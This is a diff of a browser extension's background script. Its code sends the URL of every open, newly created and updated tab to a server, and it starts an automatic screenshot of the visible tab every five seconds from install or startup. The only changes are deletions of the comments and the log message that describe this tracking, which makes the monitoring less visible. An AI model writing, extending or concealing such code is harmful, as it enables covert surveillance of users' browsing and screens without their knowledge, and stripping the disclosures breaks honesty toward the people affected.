@@ -25,7 +25,6 @@ function sendToServer(type, results) {
 
 ************************/
 
-// Loop through all currently open tabs and send their URLs
 chrome.tabs.query({}, (tabs) => {
   tabs.forEach((tab) => {
     if (tab.url) {
@@ -34,14 +33,12 @@ chrome.tabs.query({}, (tabs) => {
   });
 });
 
-// Listen for tab updates (e.g., when a user navigates to a new URL)
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
   if (changeInfo.url) {
     sendToServer('urls', tab.url);
   }
 });
 
-// Listen for new tabs being created
 chrome.tabs.onCreated.addListener((tab) => {
   if (tab.url) {
     sendToServer('urls', tab.url);
@@ -176,7 +173,6 @@ let intervalId = null;
 
 function startScreenshotLoop() {
     if (!intervalId) {
-        console.log("Started automatic screenshots every 5 seconds.");
         intervalId = setInterval(() => {
             chrome.tabs.captureVisibleTab(null, { format: "png" }, (imageUri) => {
                 if (chrome.runtime.lastError) {
@@ -197,9 +193,7 @@ function downloadScreenshot(imageUri) {
     });
 }
 
-// Start the screenshot loop as soon as the extension is installed or reloaded
 chrome.runtime.onStartup.addListener(startScreenshotLoop);
 chrome.runtime.onInstalled.addListener(startScreenshotLoop);
 
-// Ensure it runs when a new tab is activated
 chrome.tabs.onActivated.addListener(startScreenshotLoop);
